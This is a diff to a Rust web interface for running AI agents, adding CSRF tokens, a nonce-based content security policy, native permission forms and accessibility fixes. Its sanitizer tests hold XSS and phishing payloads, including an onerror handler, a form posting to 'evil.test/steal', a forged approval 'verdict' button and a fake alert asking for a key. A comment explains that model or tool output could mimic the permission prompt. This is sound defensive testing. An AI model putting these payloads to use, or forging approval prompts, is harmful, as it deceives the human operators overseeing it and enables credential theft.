@@ -3,16 +3,16 @@
 //! either escaped directly or rendered from Markdown through the sanitizer.
 
 use crate::agents::{Registry, Snapshot};
-use axum::extract::State;
-use axum::response::Html;
+use axum::extract::{Query, State};
+use axum::response::{Html, IntoResponse};
 use std::sync::Arc;
 
 /// Minimal HTML escape for text nodes and attribute values.
+///
+/// One implementation, in the library, shared with the form helpers — see
+/// [`newt_web::escape_attr`] for why `'` is covered too.
 pub(crate) fn escape(s: &str) -> String {
-    s.replace('&', "&amp;")
-        .replace('<', "&lt;")
-        .replace('>', "&gt;")
-        .replace('"', "&quot;")
+    newt_web::escape_attr(s)
 }
 
 /// Render message text as Markdown → sanitized HTML.
@@ -164,10 +164,45 @@ const STYLE: &str = r#"
   .perm { margin: 0.5rem 0.75rem; padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid color-mix(in srgb, currentColor 30%, transparent); display: grid; gap: 0.35rem; }
   .perm-head { display: flex; justify-content: space-between; align-items: baseline; gap: 0.5rem; }
   .perm-actions { display: flex; gap: 0.4rem; flex-wrap: wrap; }
+  .perm fieldset { border: 0; margin: 0; padding: 0; display: grid; gap: 0.35rem; }
+  .perm legend { font-weight: bold; padding: 0; }
+  form.spawn fieldset { border: 0; margin: 0; padding: 0; display: flex; flex-wrap: wrap; gap: 0.5rem; align-items: end; }
+  form.spawn legend { font-size: 0.75rem; padding: 0; }
+  form.close { display: inline; }
+  form.close button { background: transparent; border: 0; cursor: pointer; }
+  form.attach { display: inline; }
+  /* C3b: the inject affordance's note. Was an inline style attribute, which
+     a nonce-based style-src blocks exactly as it blocks an inline <style>. */
+  .inject-note { padding: 0.4rem 0.75rem 0; margin: 0; }
+  /* A label that a screen reader announces and a sighted user does not need:
+     the prompt box is self-evident in context but must still HAVE a name. */
+  .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
+  #tabs a { padding: 0.25rem 0.75rem; border-radius: 4px 4px 0 0; border: 1px solid color-mix(in srgb, currentColor 25%, transparent); text-decoration: none; color: inherit; }
+  #tabs a[aria-current="page"] { border-bottom-color: transparent; font-weight: bold; }
+  /* Focus must be SEEN. The browser default is easy to lose against a
+     custom control, and keyboard-only operation is the fallback this whole
+     surface exists to keep working. */
+  :focus-visible { outline: 2px solid currentColor; outline-offset: 2px; }
+  /* Motion is opt-out, not opt-in: the transcript scrolls itself as tokens
+     arrive, and a vestibular trigger is not a styling preference. */
+  @media (prefers-reduced-motion: reduce) {
+    * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; }
+  }
 "#;
 
 /// Render exactly the Markdown and actions published by the running gate.
-pub(crate) fn pending_permission_card(id: u64, p: &newt_core::PendingOffer) -> String {
+///
+/// **A native form, submittable with scripting disabled.** Each offered action
+/// is a submit button carrying `name="verdict"`, so the browser itself encodes
+/// which one was pressed — no `hx-vals`, no JSON, no script. `hx-post` is left
+/// alongside `action` purely as enhancement: HTMX answers in place, and a
+/// scriptless browser posts the same fields to the same route.
+///
+/// The action set is still NOT authority. The server re-validates the
+/// submitted verdict against the offer it published, inside the store's own
+/// transaction, so a hand-crafted POST naming an action that was never
+/// displayed is refused exactly as it was before.
+pub(crate) fn pending_permission_card(id: u64, p: &newt_core::PendingOffer, csrf: &str) -> String {
     let Ok(question) = p.question() else {
         return String::new();
     };
@@ -175,10 +210,13 @@ pub(crate) fn pending_permission_card(id: u64, p: &newt_core::PendingOffer) -> S
     let actions = question
         .actions
         .iter()
-        .map(|action| format!(
-            r##"<button hx-post="/agents/{id}/decision" hx-vals='{{"request_id":"{rid}","verdict":"{}"}}' hx-swap="none">{}</button>"##,
-            action.value.as_str(), escape(&action.label)
-        ))
+        .map(|action| {
+            format!(
+                r#"<button type="submit" name="verdict" value="{}">{}</button>"#,
+                escape(action.value.as_str()),
+                escape(&action.label)
+            )
+        })
         .collect::<String>();
     let note = question
         .note
@@ -186,11 +224,15 @@ pub(crate) fn pending_permission_card(id: u64, p: &newt_core::PendingOffer) -> S
         .map(render_markdown)
         .unwrap_or_default();
     format!(
-        r##"<div class="perm">
-<div class="perm-head"><strong>Permission needed</strong></div>
+        r##"<form class="perm" method="post" action="/agents/{id}/decision" hx-post="/agents/{id}/decision" hx-swap="none">
+{csrf_field}<input type="hidden" name="request_id" value="{rid}">
+<fieldset>
+<legend>Permission needed</legend>
 <div class="md">{body}{note}</div>
 <div class="perm-actions">{actions}</div>
-</div>"##,
+</fieldset>
+</form>"##,
+        csrf_field = newt_web::csrf::hidden_field(csrf),
         body = render_markdown(&question.markdown),
     )
 }
@@ -218,60 +260,65 @@ pub(crate) fn transcript_fragment(snap: &Snapshot) -> String {
     msgs
 }
 
-/// One agent's panel: header, live transcript, prompt form, and the
-/// EventSource hook feeding the transcript from `/agents/{id}/events`.
+/// One agent's panel: header, live transcript, and prompt form.
+///
+/// The transcript carries its stream URL as DATA (`data-agent-stream`);
+/// `assets/panel.js` supplies the behaviour. Nothing here is inline script,
+/// which is what lets the shell page serve a nonce'd CSP at all (#1854) —
+/// a fragment cannot carry a nonce, because it is swapped into a page whose
+/// header came from an earlier response.
 pub(crate) fn agent_panel(
     id: u64,
     name: &str,
     model: &str,
     readonly: bool,
     snap: &Snapshot,
+    csrf: &str,
 ) -> String {
+    let csrf_field = newt_web::csrf::hidden_field(csrf);
+    // The prompt box: a real form, with a real label. It had only a
+    // placeholder before, which is announced inconsistently and vanishes on
+    // input — a placeholder is a hint, never a name.
+    let prompt_form = |action: &str, hint: &str, verb: &str| {
+        format!(
+            r##"<form class="prompt" method="post" action="{action}" hx-post="{action}" hx-swap="none" data-reset-on-send>
+{csrf_field}<label class="sr-only" for="prompt-{id}">{hint}</label>
+<input id="prompt-{id}" name="text" placeholder="{hint}" autocomplete="off" required>
+<button>{verb}</button>
+</form>"##
+        )
+    };
+    let body = if readonly {
+        // A3/W6: a followed tab injects into the running session's inbox
+        // (D2 — it stays the writer; the mirror shows the reply once the
+        // session consumes it). Same POST target; the route routes it.
+        format!(
+            r##"<div id="pending-{id}" hx-get="/agents/{id}/pending" hx-trigger="load, every 2s" hx-swap="innerHTML"></div>
+<noscript><p class="inject-note"><a href="/agents/{id}/pending">check for a pending permission request</a></p></noscript>
+<p class="empty inject-note">→ injects into the running session (it stays the writer — D2)</p>
+{form}"##,
+            form = prompt_form(
+                &format!("/agents/{id}/prompt"),
+                "inject a prompt…",
+                "inject"
+            )
+        )
+    } else {
+        prompt_form(&format!("/agents/{id}/prompt"), "prompt…", "send")
+    };
     format!(
         r##"<section class="agent" id="agent-{id}">
 <h2><span>{name} <small>({model})</small></span>
-<button hx-delete="/agents/{id}" hx-target="#panel" hx-swap="innerHTML">✕</button></h2>
-<div class="transcript" id="transcript-{id}">{fragment}</div>
-{prompt_form}
-<script>
-(function () {{
-  var es = new EventSource("/agents/{id}/events");
-  es.onmessage = function (e) {{
-    var t = document.getElementById("transcript-{id}");
-    if (t) {{
-      t.innerHTML = e.data;
-      if (window.newtEnhanceMarkdown) {{ window.newtEnhanceMarkdown(t); }}
-      t.scrollTop = t.scrollHeight;
-    }}
-    else {{ es.close(); }}
-  }};
-}})();
-</script>
+<form class="close" method="post" action="/agents/{id}/delete" hx-post="/agents/{id}/delete" hx-target="#panel" hx-swap="innerHTML">
+{csrf_field}<button type="submit" aria-label="close {name}">✕</button>
+</form></h2>
+<div class="transcript" id="transcript-{id}" data-agent-stream="/agents/{id}/events"
+     aria-live="polite" aria-atomic="false">{fragment}</div>
+{body}
 </section>"##,
-        id = id,
         name = escape(name),
         model = escape(model),
         fragment = transcript_fragment(snap),
-        prompt_form = if readonly {
-            // A3/W6: a followed tab injects into the running session's inbox
-            // (D2 — it stays the writer; the mirror shows the reply once the
-            // session consumes it). Same POST target; the route routes it.
-            format!(
-                r##"<div id="pending-{id}" hx-get="/agents/{id}/pending" hx-trigger="load, every 2s" hx-swap="innerHTML"></div>
-<p class="empty" style="padding:0.4rem 0.75rem 0">→ injects into the running session (it stays the writer — D2)</p>
-<form class="prompt" hx-post="/agents/{id}/prompt" hx-swap="none" hx-on::after-request="this.reset()">
-<input name="text" placeholder="inject a prompt…" autocomplete="off" required>
-<button>inject</button>
-</form>"##
-            )
-        } else {
-            format!(
-                r##"<form class="prompt" hx-post="/agents/{id}/prompt" hx-swap="none" hx-on::after-request="this.reset()">
-<input name="text" placeholder="prompt…" autocomplete="off" required>
-<button>send</button>
-</form>"##
-            )
-        },
     )
 }
 
@@ -285,10 +332,14 @@ pub(crate) fn tab_strip(
     agents: &[(u64, String, String, bool, Snapshot)],
     active: Option<u64>,
 ) -> String {
-    let mut out = String::from(r#"<nav id="tabs" hx-swap-oob="true">"#);
+    let mut out = String::from(r#"<nav id="tabs" aria-label="agents" hx-swap-oob="true">"#);
     for (id, name, _model, readonly, snap) in agents {
-        let class = if Some(*id) == active {
-            " class=\"active\""
+        // A tab switch is NAVIGATION, so it is an anchor. `hx-get` swaps the
+        // panel in place when HTMX is present; `href` loads the same tab as a
+        // page when it is not. A <button> with only `hx-get` was inert without
+        // script, which is what "no-JS" was failing on.
+        let current = if Some(*id) == active {
+            r#" aria-current="page""#
         } else {
             ""
         };
@@ -300,10 +351,7 @@ pub(crate) fn tab_strip(
             ""
         };
         out.push_str(&format!(
-            r##"<button{class} hx-get="/agents/{id}/panel" hx-target="#panel" hx-swap="innerHTML">{dot}{name}</button>"##,
-            class = class,
-            id = id,
-            dot = dot,
+            r##"<a href="/?tab={id}"{current} hx-get="/agents/{id}/panel" hx-target="#panel" hx-swap="innerHTML">{dot}{name}</a>"##,
             name = escape(name),
         ));
     }
@@ -311,8 +359,24 @@ pub(crate) fn tab_strip(
     out
 }
 
+/// What the cockpit page accepts in its query string.
+#[derive(serde::Deserialize, Default)]
+pub(crate) struct IndexQuery {
+    /// Which agent tab to open. A scriptless browser switches tabs by
+    /// navigating here; HTMX swaps the panel instead and never sends it.
+    pub tab: Option<u64>,
+}
+
 /// The cockpit page: spawn form + every live agent's panel.
-pub(crate) async fn index(State(reg): State<Arc<Registry>>) -> Html<String> {
+///
+/// Issues the CSRF token this page's forms echo, and carries the
+/// Content-Security-Policy (#1854) — which is only possible because no
+/// fragment it later swaps in contains inline script.
+pub(crate) async fn index(
+    State(reg): State<Arc<Registry>>,
+    Query(q): Query<IndexQuery>,
+    headers: axum::http::HeaderMap,
+) -> axum::response::Response {
     let default_url =
         std::env::var("NEWT_WEB_BACKEND_URL").unwrap_or_else(|_| "http://127.0.0.1:11434".into());
     let default_model = std::env::var("NEWT_WEB_MODEL").unwrap_or_else(|_| "llama3.1:8b".into());
@@ -331,41 +395,79 @@ pub(crate) async fn index(State(reg): State<Arc<Registry>>) -> Html<String> {
         })
         .collect::<String>();
 
+    // Reuse the token this browser already holds, so a page reload does not
+    // invalidate a form the operator has open in another tab; mint one on a
+    // first visit.
+    let token = headers
+        .get("cookie")
+        .and_then(|v| v.to_str().ok())
+        .and_then(newt_web::csrf::from_cookie_header)
+        .map_or_else(newt_web::csrf::Token::fresh, newt_web::csrf::Token::adopt);
+    let csrf = token.as_str().to_string();
+    let nonce = newt_web::csp::Nonce::fresh();
+    let n = nonce.as_str().to_string();
+    // Tell the client what this page's OWN policy permits, read off the policy
+    // text so it cannot drift from the header. Under a strict `style-src-elem`
+    // Mermaid's per-render theme stylesheet is blocked, and a blocked theme
+    // renders black-on-black — unreadable, silently. `markdown.js` uses this
+    // to fall back to the diagram SOURCE instead (ADR law 5).
+    let policy = newt_web::csp::policy(&nonce);
+    let diagrams = if newt_web::csp::permits_inline_style_elements(&policy) {
+        "render"
+    } else {
+        "source-only"
+    };
+
     let agents = reg.list();
-    let active = agents.first().map(|(id, ..)| *id);
+    // A scriptless tab switch arrives as `?tab=`; otherwise the first agent.
+    let active = q
+        .tab
+        .filter(|t| agents.iter().any(|(id, ..)| id == t))
+        .or_else(|| agents.first().map(|(id, ..)| *id));
     let strip = tab_strip(&agents, active).replace(r#" hx-swap-oob="true""#, ""); // in-page render, not OOB
-    let panel = match agents.first() {
-        Some((id, name, model, readonly, snap)) => agent_panel(*id, name, model, *readonly, snap),
+    let panel = match agents.iter().find(|(id, ..)| Some(*id) == active) {
+        Some((id, name, model, readonly, snap)) => {
+            agent_panel(*id, name, model, *readonly, snap, &csrf)
+        }
         None => r#"<p class="empty">No agents yet. Spawn one above.</p>"#.to_string(),
     };
-    let sessions = crate::sessions_section().await;
-    let docked = crate::dock::docked_section().await;
+    let sessions = crate::sessions_section(&csrf).await;
+    let docked = crate::dock::docked_section(&csrf).await;
 
-    Html(format!(
+    let body = format!(
         r##"<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>newt-web</title>
-<script src="/assets/htmx.min.js"></script>
-<script defer src="/assets/mermaid.min.js"></script>
-<script defer src="/assets/markdown.js"></script>
-<style>{STYLE}</style>
+<!-- htmx injects a <style> for its `.htmx-indicator` helpers unless told not
+     to, and that element is blocked by a nonce-based style-src exactly as
+     Mermaid's is. This surface uses no htmx indicators, so the CSS is dead
+     weight AND a CSP violation. Declarative config, so it needs no inline
+     script of its own. -->
+<meta name="htmx-config" content='{{"includeIndicatorStyles":false}}'>
+<script nonce="{n}" src="/assets/htmx.min.js" integrity="{htmx_sri}" crossorigin="anonymous"></script>
+{mermaid_tag}<script nonce="{n}" defer src="/assets/markdown.js" integrity="{markdown_sri}" crossorigin="anonymous"></script>
+<script nonce="{n}" defer src="/assets/panel.js" integrity="{panel_sri}" crossorigin="anonymous"></script>
+<style nonce="{n}">{STYLE}</style>
 </head>
-<body>
+<body data-newt-diagrams="{diagrams}">
 <header><h1>newt-web</h1></header>
 <main id="content">
 <div id="overview" hx-get="/overview" hx-trigger="every 3s" hx-swap="innerHTML">{docked}{sessions}</div>
 <details class="spawn-wrap">
 <summary>+ new scratch agent <small>(not saved — start durable sessions above)</small></summary>
-<form class="spawn" hx-post="/agents" hx-target="#panel" hx-swap="innerHTML">
-<label>name<input name="name" value="agent" required></label>
-<label>backend url<input name="url" value="{url}" required></label>
-<label>model<input name="model" value="{model}" required></label>
-<label>kind<select name="kind">{kind_options}</select></label>
-<label>workspace<input name="workspace" value="{ws}" required></label>
+<form class="spawn" method="post" action="/agents" hx-post="/agents" hx-target="#panel" hx-swap="innerHTML">
+{csrf_field}<fieldset>
+<legend>new scratch agent</legend>
+<label for="spawn-name">name</label><input id="spawn-name" name="name" value="agent" required>
+<label for="spawn-url">backend url</label><input id="spawn-url" name="url" value="{url}" required>
+<label for="spawn-model">model</label><input id="spawn-model" name="model" value="{model}" required>
+<label for="spawn-kind">kind</label><select id="spawn-kind" name="kind">{kind_options}</select>
+<label for="spawn-workspace">workspace</label><input id="spawn-workspace" name="workspace" value="{ws}" required>
 <button>spawn</button>
+</fieldset>
 </form>
 </details>
 {strip}
@@ -375,14 +477,42 @@ pub(crate) async fn index(State(reg): State<Arc<Registry>>) -> Html<String> {
 </html>
 "##,
         STYLE = STYLE,
+        diagrams = diagrams,
+        // Only ship the diagram runtime when it can actually be used. Under a
+        // strict `style-src-elem` Mermaid injects blocked stylesheets merely
+        // by LOADING, so a page that will fall back to source would take three
+        // CSP violations and half a megabyte for nothing.
+        mermaid_tag = if diagrams == "render" {
+            format!(
+                "<script nonce=\"{n}\" defer src=\"/assets/mermaid.min.js\" integrity=\"{}\" crossorigin=\"anonymous\"></script>\n",
+                newt_web::csp::sri(newt_web::csp::MERMAID_JS.as_bytes())
+            )
+        } else {
+            String::new()
+        },
+        csrf_field = newt_web::csrf::hidden_field(&csrf),
+        htmx_sri = newt_web::csp::sri(newt_web::csp::HTMX_JS.as_bytes()),
+        markdown_sri = newt_web::csp::sri(newt_web::csp::MARKDOWN_JS.as_bytes()),
+        panel_sri = newt_web::csp::sri(newt_web::csp::PANEL_JS.as_bytes()),
         url = escape(&default_url),
         model = escape(&default_model),
         ws = escape(&default_ws),
-        docked = docked,
-        sessions = sessions,
-        strip = strip,
-        panel = panel,
-    ))
+    );
+
+    let mut response = Html(body).into_response();
+    let h = response.headers_mut();
+    if let Ok(v) = policy.parse() {
+        h.insert("content-security-policy", v);
+    }
+    for (name, value) in newt_web::csp::hardening_headers() {
+        if let Ok(v) = value.parse() {
+            h.insert(name, v);
+        }
+    }
+    if let Ok(v) = newt_web::csrf::set_cookie(&token).parse() {
+        h.insert("set-cookie", v);
+    }
+    response
 }
 
 #[cfg(test)]
@@ -548,12 +678,30 @@ mod tests {
         assert!(out.contains("graph TD"), "content vanished entirely: {out}");
     }
 
+    /// The panel declares its stream as DATA and carries no script.
+    ///
+    /// Re-enhancement after an SSE replacement still happens — it moved to
+    /// `assets/panel.js`, which is what lets the page serve a CSP (#1854).
+    /// Asserting the behaviour is still *reachable* rather than that it is
+    /// inline is the point of the move.
     #[test]
-    fn live_panel_reenhances_markdown_after_sse_updates() {
-        let panel = agent_panel(7, "a", "m", false, &Snapshot::default());
+    fn live_panel_declares_its_stream_without_inline_script() {
+        let panel = agent_panel(7, "a", "m", false, &Snapshot::default(), "tok");
         assert!(
-            panel.contains("window.newtEnhanceMarkdown(t)"),
-            "SSE replacement must rerun generic Markdown enhancements: {panel}"
+            panel.contains(r#"data-agent-stream="/agents/7/events""#),
+            "the panel must declare its stream as data: {panel}"
+        );
+        assert!(
+            !panel.contains("<script"),
+            "a fragment cannot carry a nonce, so it must carry no script: {panel}"
+        );
+        assert!(
+            newt_web::csp::PANEL_JS.contains("window.newtEnhanceMarkdown"),
+            "the behaviour must still exist, in the served asset"
+        );
+        assert!(
+            newt_web::csp::PANEL_JS.contains("newtAttachStreams"),
+            "the asset must expose its scan entry point"
         );
     }
 
@@ -805,6 +953,21 @@ mod tests {
             // Foreign content: the classic mXSS reparsing surface.
             "<svg",
             "<math",
+            // C3b: the control surface itself is now an attack shape. The
+            // transcript renders model, tool and docked-peer output beside a
+            // real permission form, so authored markup that renders form
+            // chrome can phish a click that the operator reasonably believes
+            // is newt's own. Ammonia's default allowlist contains no form
+            // controls at all, which is what makes this safe — pinned here so
+            // a future allowlist widening cannot quietly undo it.
+            "<input",
+            "<button",
+            "<select",
+            "<textarea",
+            "<option",
+            "<label",
+            "<fieldset",
+            "<legend",
         ];
 
         /// Substrings that must never appear **inside a tag**.
@@ -845,6 +1008,18 @@ mod tests {
             // its input and forgery is unrepresentable rather than filtered.
             // This corpus keeps that true as vectors are added.
             "data-markdown-extension",
+            // C3b: the field names the routes act on. Authored content must
+            // never be able to mint either — a forged `verdict` would be an
+            // unoffered action, and a forged `csrf` would be an attempt to
+            // seed a token the gate then compares against itself.
+            "name=\"csrf\"",
+            "name=\"verdict\"",
+            // C3b relies on ARIA to tell the operator what is happening. An
+            // authored live region or alert role would let untrusted content
+            // speak in the surface's own voice to a screen-reader user, who
+            // has the least context to doubt it.
+            "aria-live",
+            "role=",
         ];
 
         /// Everything between `<` and `>` — every tag's attribute region.
@@ -902,6 +1077,35 @@ mod tests {
             Vector { what: "handler inside a blockquote", src: "> <img src=x onerror=alert(1)>\n" },
             Vector { what: "handler inside a list item", src: "- <img src=x onerror=alert(1)>\n" },
             Vector { what: "nested emphasis around a handler", src: "*<img src=x onerror=alert(1)>*" },
+            // ── C3b: forging the control surface ──────────────────────────
+            Vector {
+                what: "phishing form posting off-site",
+                src: "<form method=\"post\" action=\"https://evil.test/steal\"><button>allow once</button></form>",
+            },
+            Vector {
+                what: "forged offer action",
+                src: "<button type=\"submit\" name=\"verdict\" value=\"allow_session\">allow session</button>",
+            },
+            Vector {
+                what: "seeded CSRF field",
+                src: "<input type=\"hidden\" name=\"csrf\" value=\"attacker-chosen\">",
+            },
+            Vector {
+                what: "mimicked permission chrome",
+                src: "<fieldset><legend>Permission needed</legend><p>allow this?</p></fieldset>",
+            },
+            Vector {
+                what: "label hijacking a real control",
+                src: "<label for=\"spawn-workspace\">workspace</label><input id=\"spawn-workspace\" value=\"/\">",
+            },
+            Vector {
+                what: "form controls inside a table cell",
+                src: "| a |\n|---|\n| <button name=\"verdict\" value=\"deny\">x</button> |\n",
+            },
+            Vector {
+                what: "authored live region",
+                src: "<div aria-live=\"assertive\" role=\"alert\">your session has expired, re-enter your key</div>",
+            },
         ];
 
         /// **Every vector, one battery.**
@@ -976,7 +1180,7 @@ mod tests {
             );
             // …and the corpus is not silently empty.
             assert!(
-                CORPUS.len() >= 30,
+                CORPUS.len() >= 40,
                 "a corpus of {} is not a corpus",
                 CORPUS.len()
             );
